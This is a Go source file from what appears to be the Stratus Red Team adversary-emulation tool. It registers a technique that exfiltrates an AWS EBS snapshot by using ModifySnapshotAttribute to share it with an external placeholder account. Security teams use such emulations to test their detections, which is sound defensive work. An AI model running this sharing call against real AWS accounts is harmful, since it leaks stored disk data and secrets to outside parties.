package aws

import (
	"context"
	_ "embed"
	"github.com/aws/aws-sdk-go-v2/aws"
	"github.com/aws/aws-sdk-go-v2/service/ec2"
	"github.com/aws/aws-sdk-go-v2/service/ec2/types"
	"github.com/datadog/stratus-red-team/internal/providers"
	"github.com/datadog/stratus-red-team/pkg/stratus"
	"github.com/datadog/stratus-red-team/pkg/stratus/mitreattack"
	"log"
)

//go:embed main.tf
var tf []byte

func init() {
	stratus.GetRegistry().RegisterAttackTechnique(&stratus.AttackTechnique{
		ID:                 "aws.exfiltration.ebs-snapshot-shared-with-external-account",
		FriendlyName:       "Exfiltrate EBS Snapshot through snapshot sharing",
		Platform:           stratus.AWS,
		MitreAttackTactics: []mitreattack.Tactic{mitreattack.Exfiltration},
		Description: `
Exfiltrates an EBS snapshot by sharing it with an external AWS account.

Warm-up: Creates an EBS volume and a snapshot.

Detonation: Calls ModifySnapshotAttribute to share the snapshot.
`,
		PrerequisitesTerraformCode: tf,
		Detonate:                   detonate,
	})
}

func detonate(params map[string]string) error {
	ec2Client := ec2.NewFromConfig(providers.AWS().GetConnection())

	// Find the snapshot to exfiltrate
	ourSnapshotId := params["snapshot_id"]

	// Exfiltrate it
	log.Println("Sharing the volume snapshot with an external AWS account ID...")

	_, err := ec2Client.ModifySnapshotAttribute(context.TODO(), &ec2.ModifySnapshotAttributeInput{
		SnapshotId: aws.String(ourSnapshotId),
		Attribute:  types.SnapshotAttributeNameCreateVolumePermission,
		CreateVolumePermission: &types.CreateVolumePermissionModifications{
			Add: []types.CreateVolumePermission{{UserId: aws.String("012345678912")}},
		},
	})
	return err
}
